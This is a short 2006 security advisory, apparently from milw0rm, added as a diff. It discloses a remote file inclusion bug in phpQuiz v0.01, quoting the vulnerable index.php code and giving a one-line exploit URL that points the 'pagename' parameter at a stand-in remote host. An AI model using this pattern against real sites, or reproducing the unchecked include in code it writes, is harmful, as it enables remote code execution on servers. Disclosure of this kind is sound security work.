@@ -1,0 +1,42 @@
+#############################SolpotCrew Community################################
+#
+#  phpQuiz v0.01 design and coding byJule Slootbeek (pagename) Remote File Inclusion
+#
+#  Download file : http://www.furor-normannicus.de/phpQuiz/download/phpQuiz.zip
+#
+#################################################################################
+#
+#
+#       Bug Found By :Solpot a.k.a (k. Hasibuan) (14-09-2006)
+#
+#       contact: chris_hasibuan@yahoo.com
+#
+#       Website : http://www.nyubicrew.org/adv/solpot-adv-07.txt
+#
+################################################################################
+#
+#
+#      Greetz: choi , h4ntu , Ibnusina , r4dja , No-profile , begu , madkid
+#              robby , Matdhule , setiawan , m3lky , NpR , Fungky , barbarosa
+#              home_edition2001 , Rendy , cow_1seng , ^^KaBRuTz , bYu , Lappet-homo
+#              Blue|spy , cah|gemblung , Slacky , blind_boy , camagenta , XdikaX
+#              x-ace , Dalmet , th3sn0wbr4in , iFX , ^YoGa^ ,#nyubi , #hitamputih @dalnet
+#              and all member solpotcrew community @ http://www.nyubicrew.org/forum/
+#              especially thx to str0ke @ milw0rm.com
+#
+###############################################################################
+Input passed to the "pagename" is not properly verified 
+before being used to include files. This can be exploited to execute 
+arbitrary PHP code by including files from local or external resources. 
+code from index.php
+<?php
+ //include global variables.
+ include('global.inc.php');
+ if (empty($pagename)) $pagename=main_menu;
+ require ("$pagename.php");
+?>
+exploit : http://somehost/path_to_phpQuiz/index.php?pagename=http://evil
+##############################MY LOVE JUST FOR U RIE######################### 
+######################################E.O.F################################## 
+
+# milw0rm.com [2006-09-14]
